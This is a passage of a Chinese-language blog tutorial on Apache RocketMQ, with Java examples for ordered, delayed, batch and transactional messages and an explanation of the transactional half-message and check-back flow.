<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 订单实体类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderStep</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订单id</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> orderId;</span><br><span class="line">    <span class="comment">// 订单业务描述</span></span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getter、setter、toString方法省略</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成模拟订单，创建3个订单，每个订单三个步骤</span></span><br><span class="line"><span class="comment">     * 要保证一个订单的3个步骤发送到同一个队列，并且由一个线程处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;OrderStep&gt; <span class="title function_">buildOrders</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;OrderStep&gt; orderList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;OrderStep&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">OrderStep</span> <span class="variable">orderDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1039L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;创建&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1065L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;创建&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1039L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;付款&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">7235L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;创建&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1065L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;付款&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">7235L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;付款&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1065L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;完成&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">7235L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;完成&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        orderDemo = <span class="keyword">new</span> <span class="title class_">OrderStep</span>();</span><br><span class="line">        orderDemo.setOrderId(<span class="number">1039L</span>);</span><br><span class="line">        orderDemo.setDesc(<span class="string">&quot;完成&quot;</span>);</span><br><span class="line">        orderList.add(orderDemo);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> orderList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group2&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="comment">// 生成3个订单</span></span><br><span class="line">        List&lt;OrderStep&gt; orders = OrderStep.buildOrders();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (OrderStep order : orders) &#123;</span><br><span class="line">            <span class="comment">// 创建消息</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> order + <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;orderTopic&quot;</span>, <span class="string">&quot;order&quot;</span>, body.getBytes());</span><br><span class="line">            <span class="comment">/** 发送顺序消息</span></span><br><span class="line"><span class="comment">             *  参数1：发送的消息</span></span><br><span class="line"><span class="comment">             *  参数2：队列选择器（即本条消息需要发送到哪个队列）</span></span><br><span class="line"><span class="comment">             *  参数3：选择队列的参数（我们使用订单id，即同一id的订单消息会被发送到同一队列）</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> producer.send(message, <span class="keyword">new</span> <span class="title class_">MessageQueueSelector</span>() &#123;</span><br><span class="line">                <span class="comment">/** 消息选择器回调方法</span></span><br><span class="line"><span class="comment">                 *  参数1：所有可用的队列</span></span><br><span class="line"><span class="comment">                 *  参数2：发送的消息</span></span><br><span class="line"><span class="comment">                 *  参数3：选择队列的参数</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> MessageQueue <span class="title function_">select</span><span class="params">(List&lt;MessageQueue&gt; mqs, Message msg, Object arg)</span> &#123;</span><br><span class="line">                    <span class="comment">// 用订单id模队列数的方式选择队列</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">long</span>) arg % mqs.size();</span><br><span class="line">                    <span class="comment">// 返回选择的队列</span></span><br><span class="line">                    <span class="keyword">return</span> mqs.get((<span class="type">int</span>) index);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, order.getOrderId());</span><br><span class="line">            <span class="comment">// 打印发送结果</span></span><br><span class="line">            System.out.println(sendResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送顺序消息时，需要手动指定每条消息发送至哪个队列，我们根据消息的订单id选择队列，这样就可以保证相同订单id的消息被发送至同一个队列。</p>
<h3 id="顺序消息消费"><a href="#顺序消息消费" class="headerlink" title="顺序消息消费"></a>顺序消息消费</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建消费者</span></span><br><span class="line">        <span class="type">DefaultMQPushConsumer</span> <span class="variable">consumer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQPushConsumer</span>(<span class="string">&quot;group2&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        consumer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 订阅Topic</span></span><br><span class="line">        consumer.subscribe(<span class="string">&quot;orderTopic&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 设置Consumer从队列的哪个位置开始消费：</span></span><br><span class="line"><span class="comment">         * CONSUME_FROM_FIRST_OFFSET：从队列头部开始消费</span></span><br><span class="line"><span class="comment">         * CONSUME_FROM_LAST_OFFSET：如果非第一次启动，那么按照上次消费的位置继续消费</span></span><br><span class="line"><span class="comment">         * CONSUME_FROM_TIMESTAMP：从某个时间开始消费，需要配合setConsumeTimestamp方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);</span><br><span class="line">        <span class="comment">/** 注册消息监听触发器</span></span><br><span class="line"><span class="comment">         *  使用MessageListenerOrderly实现消息监听器</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        consumer.registerMessageListener(<span class="keyword">new</span> <span class="title class_">MessageListenerOrderly</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 监听方法</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> ConsumeOrderlyStatus <span class="title function_">consumeMessage</span><span class="params">(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context)</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (MessageExt msg : msgs) &#123;</span><br><span class="line">                    <span class="comment">// 打印消费的线程名称和消息</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;线程名称:&quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; | 消费消息&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(msg.getBody()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ConsumeOrderlyStatus.SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动消费者</span></span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之前我们使用MessageListenerConcurrently类实现消息监听器，它每次都是从多个队列中取一批数据，不能保证消息的顺序。而顺序消费模式下需使用MessageListenerOrderly实现消息监听器，在RocketMQ内部就会通过锁队列的方式保证消息是一个一个队列来取的，RocketMQ会自动给每个队列分配一个线程，这样就能保证消息的顺序性。</p>
<h2 id="延时消息"><a href="#延时消息" class="headerlink" title="延时消息"></a>延时消息</h2><p>延时消息很好理解，就是发送消息给MQ后，间隔一段时间再去消费。发送延时消息代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DelayProducer</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group3&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;delayTopic&quot;</span>, <span class="string">&quot;tag1&quot;</span>, (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            <span class="comment">// 设置延迟级别</span></span><br><span class="line">            message.setDelayTimeLevel(<span class="number">3</span>);</span><br><span class="line">            <span class="comment">// 发送消息</span></span><br><span class="line">            producer.send(message);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，开源版的RocketMQ并不支持任意时间的延时（商业版支持任意时间），只能设置以下几个固定的延时等级，从1s到2h分别对应着等级1到18：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// orgapache.rocketmq.store.config.MessageStoreConfig.java</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">messageDelayLevel</span> <span class="operator">=</span> <span class="string">&quot;1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="批量消息"><a href="#批量消息" class="headerlink" title="批量消息"></a>批量消息</h2><p>批量发送消息能显著提高传递小消息的性能。限制是这些<strong>批量消息应该有相同的topic</strong>，相同的<code>waitStoreMsgOK</code>（刷盘策略），而且<strong>不能是延时消息</strong>。此外，这一批消息的总大小不应超过4MB。</p>
<ul>
<li>消息的总长度可能大于4MB，我们可以通过以下方法进行分割</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatchMsgSeparator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;List&lt;Message&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 限制最大长度为4MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">LIMIT_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前消息下标</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> currentIndex;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 消息列表</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Message&gt; messages;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BatchMsgSeparator</span><span class="params">(List&lt;Message&gt; messages)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.currentIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.messages = messages;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentIndex &lt; messages.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Message&gt; <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 记录子消息列表长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">totalLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 下一个消息的下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nextIndex</span> <span class="operator">=</span> currentIndex;</span><br><span class="line">        <span class="comment">// 遍历消息列表</span></span><br><span class="line">        <span class="keyword">for</span> (; nextIndex &lt; messages.size(); nextIndex++) &#123;</span><br><span class="line">            <span class="comment">// 获取当前消息</span></span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> messages.get(nextIndex);</span><br><span class="line">            <span class="comment">// 计算当前消息长度(消息体长度+Topic长度+日志开销+属性长度)</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">msgLength</span> <span class="operator">=</span> message.getBody().length + message.getTopic().length() + <span class="number">20</span>;</span><br><span class="line">            Map&lt;String, String&gt; properties = message.getProperties();</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : properties.entrySet()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">propLength</span> <span class="operator">=</span> entry.getKey().length() + entry.getValue().length();</span><br><span class="line">                msgLength += propLength;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将当前消息长度加到子消息列表长度</span></span><br><span class="line">            totalLength += msgLength;</span><br><span class="line">            <span class="comment">// 如果单条消息就超过了4MB,则该消息不能被发送</span></span><br><span class="line">            <span class="keyword">if</span> (msgLength &gt; LIMIT_SIZE) &#123;</span><br><span class="line">                <span class="comment">// 如果当前子消息列表还没有消息</span></span><br><span class="line">                <span class="keyword">if</span> (currentIndex == nextIndex) &#123;</span><br><span class="line">                    <span class="comment">// 跳过该条消息</span></span><br><span class="line">                    currentIndex++;</span><br><span class="line">                    <span class="comment">// 清零记录长度的值</span></span><br><span class="line">                    totalLength = <span class="number">0</span>;</span><br><span class="line">                    <span class="comment">// 继续循环</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果当前子消息列表已有消息，则返回并且跳过该条消息</span></span><br><span class="line">                List&lt;Message&gt; subList = <span class="built_in">this</span>.messages.subList(currentIndex, nextIndex);</span><br><span class="line">                currentIndex = ++nextIndex;</span><br><span class="line">                <span class="keyword">return</span> subList;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如子消息列表的总长度超过了4MB,结束循环</span></span><br><span class="line">            <span class="keyword">if</span> (totalLength &gt; LIMIT_SIZE) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回子消息列表(其中不包括下标为nextIndex的消息)</span></span><br><span class="line">        List&lt;Message&gt; subList = <span class="built_in">this</span>.messages.subList(currentIndex, nextIndex);</span><br><span class="line">        currentIndex = nextIndex;</span><br><span class="line">        <span class="keyword">return</span> subList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>发送批量消息</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BatchProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">DefaultMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQProducer</span>(<span class="string">&quot;group4&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="comment">// 创建消息列表</span></span><br><span class="line">        ArrayList&lt;Message&gt; messages = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 创建5条消息</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;batchTopic&quot;</span>, <span class="string">&quot;tag1&quot;</span>, (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            messages.add(message);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 消息分割</span></span><br><span class="line">        <span class="type">BatchMsgSeparator</span> <span class="variable">separator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BatchMsgSeparator</span>(messages);</span><br><span class="line">        <span class="keyword">while</span> (separator.hasNext())&#123;</span><br><span class="line">            <span class="comment">// 批量发送消息</span></span><br><span class="line">            producer.send(separator.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送消息结束，关闭Producer实例。</span></span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="事务消息"><a href="#事务消息" class="headerlink" title="事务消息"></a>事务消息</h2><p>事务消息是RocketMQ提供的一个非常有特色的功能。官网的介绍是：事务消息是在分布式系统中保证最终一致性的两阶段提交的消息实现。他可以保证本地事务执行与消息发送两个操作的原子性，也就是这两个操作一起成功或者一起失败。</p>
<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>事务消息的基本流程如下图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/29/aZxtE2AbznLPsIr.jpg"
                      alt="Screenshot_109.jpg"
                ></p>
<ul>
<li>事务消息发送及提交阶段流程如下：</li>
</ul>
<ol>
<li>发送消息（half消息，用于检查和MQ的连通性）。</li>
<li>服务端响应消息写入结果。</li>
<li>根据发送结果执行本地事务（如果写入失败，此时half消息对业务不可见，本地逻辑不执行）。</li>
<li>根据本地事务状态执行Commit或者Rollback（Commit操作后，生成消息索引，消息对消费者可见）。</li>
</ol>
<ul>
<li>事务补偿阶段的流程如下：</li>
</ul>
<ol>
<li>对没有Commit&#x2F;Rollback的事务消息（pending状态的消息），从服务端发起一次回查。</li>
<li>Producer收到回查消息，检查回查消息对应的本地事务的状态。</li>
<li>根据本地事务状态，重新Commit或者Rollback。</li>
<li>如果回查的事务状态仍然是Unknown，那么会重复上面3步继续回查。</li>
</ol>
<p>其中，补偿阶段用于解决消息Commit或者Rollback发生超时或者失败的情况。如果事务补偿的过程中，事务状态一直是Unknown会不会死循环呢？RocketMQ中默认最多回查15次，如果超过了15次事务还未提交那么就会丢弃本次事务消息。</p>
<ul>
<li>事务消息状态</li>
</ul>
<p>事务消息共有三种状态，提交状态、回滚状态、中间状态：</p>
<ol>
<li>TransactionStatus.CommitTransaction: 提交事务，它允许消费者消费此消息。</li>
<li>TransactionStatus.RollbackTransaction: 回滚事务，它代表该消息将被删除，不允许被消费。</li>
<li>TransactionStatus.Unknown: 中间状态，它代表需要检查消息队列来确定状态。</li>
</ol>
<h3 id="事务消息生产者"><a href="#事务消息生产者" class="headerlink" title="事务消息生产者"></a>事务消息生产者</h3><p>使用<strong>TransactionProducer</strong>类创建生产者，并指定唯一的 <code>ProducerGroup</code>，就可以设置自定义线程池来处理这些检查请求。执行本地事务后、需要根据执行结果对消息队列进行回复：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransactionProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建生产者，指定生产组名称</span></span><br><span class="line">        <span class="type">TransactionMQProducer</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransactionMQProducer</span>(<span class="string">&quot;group5&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置nameSrv地址</span></span><br><span class="line">        producer.setNamesrvAddr(<span class="string">&quot;192.168.74.77:9876;192.168.74.88:9876&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置事务消息监听器</span></span><br><span class="line">        producer.setTransactionListener(<span class="keyword">new</span> <span class="title class_">TransactionListener</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 回调方法(执行本地事务)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> LocalTransactionState <span class="title function_">executeLocalTransaction</span><span class="params">(Message msg, Object arg)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (msg.getTags().equals(<span class="string">&quot;tagA&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;tagA事务提交&quot;</span>);</span><br><span class="line">                    <span class="comment">// tag为tagA的事务状态设置为提交</span></span><br><span class="line">                    <span class="keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg.getTags().equals(<span class="string">&quot;tagB&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;tagB事务回滚&quot;</span>);</span><br><span class="line">                    <span class="comment">// tag为tagB的事务状态设置为回滚</span></span><br><span class="line">                    <span class="keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg.getTags().equals(<span class="string">&quot;tagC&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;tagC事务状态不确定&quot;</span>);</span><br><span class="line">                    <span class="comment">// tag为tagC的事务状态设置为不确定</span></span><br><span class="line">                    <span class="keyword">return</span> LocalTransactionState.UNKNOW;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> LocalTransactionState.UNKNOW;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 回查方法(查看本地事务状态)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> LocalTransactionState <span class="title function_">checkLocalTransaction</span><span class="params">(MessageExt msg)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;tag为&quot;</span>+msg.getTags()+<span class="string">&quot;的事务调用回查方法&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 启动生产者</span></span><br><span class="line">        producer.start();</span><br><span class="line">        <span class="comment">// 定义三个不同tag</span></span><br><span class="line">        String tags[] = &#123;<span class="string">&quot;tagA&quot;</span>, <span class="string">&quot;tagB&quot;</span>, <span class="string">&quot;tagC&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">// 发送3条消息</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;transactionTopic&quot;</span>, tags[i], (<span class="string">&quot;消息&quot;</span> + i).getBytes());</span><br><span class="line">            <span class="comment">// 发送事务消息</span></span><br><span class="line">            <span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> producer.sendMessageInTransaction(message, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 输出响应结果i</span></span><br><span class="line">            System.out.println(<span class="string">&quot;发送结果:&quot;</span> + sendResult);</span><br><span class="line">            <span class="comment">// 线程休眠2s</span></span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送消息之前，通过<strong>setTransactionListener</strong>来设置事务消息监听器，实现两个回调方法。</p>
<p>当发送半消息成功时， <code>executeLocalTransaction</code> 方法触发执行本地事务回调(流程图中第③步)。<code>checkLocalTranscation</code> 方法用于回查本地事务状态(流程图中第⑥步)，并回应消息队列的检查请求。</p>
<p>代码中，我们将标签为tagA的事务状态设置为COMMIT_MESSAGE，这样消费者可以成功接收到消息。tagB的事务状态设置为ROLLBACK_MESSAGE，这样消费者无法接收到消息。tagC的事务状态设置为UNKNOW，这样MQ会自动发起回查，回查后状态变为COMMIT_MESSAGE，消费者最终也能够接收到消息。</p>
